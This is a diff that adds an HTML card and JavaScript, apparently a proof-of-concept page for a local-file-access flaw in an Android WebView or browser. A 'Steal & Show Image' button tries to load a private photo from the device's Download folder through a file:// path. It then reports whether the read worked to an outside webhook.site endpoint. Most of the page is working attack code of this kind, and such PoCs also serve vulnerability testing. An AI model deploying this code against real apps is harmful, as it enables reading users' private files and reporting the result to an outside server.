@@ -1,0 +1,36 @@
+<div class="card">
+    <h3>4. Private Photo Access</h3>
+    <p style="font-size:12px;">Target: Download/about.jpg</p>
+    <button onclick="grabLocalImage()">Steal & Show Image</button>
+    <div id="imagePreview" style="margin-top:10px;"></div>
+</div>
+
+<script>
+function grabLocalImage() {
+    const filePath = "file:///storage/emulated/0/Download/about.jpg";
+    const logBox = document.getElementById('console');
+    const preview = document.getElementById('imagePreview');
+    
+    logBox.innerText = "> Attempting to access: " + filePath;
+
+    // Image element create karke source set karna
+    let img = new Image();
+    img.src = filePath;
+    img.style.width = "100%";
+    img.style.borderRadius = "8px";
+    img.style.border = "2px solid red";
+
+    img.onload = function() {
+        logBox.innerText = "SUCCESS: Image accessed from local storage!";
+        preview.appendChild(img);
+        
+        // Webhook pe success report bhejna
+        fetch("https://webhook.site/ccc5a516-132a-4a1b-9d20-dc323e820bd3?impact=local_image_read_success");
+    };
+
+    img.onerror = function() {
+        logBox.innerText = "FAILED: Could not load image. (Path wrong or Permission denied)";
+        fetch("https://webhook.site/ccc5a516-132a-4a1b-9d20-dc323e820bd3?impact=local_image_read_failed");
+    };
+}
+</script>
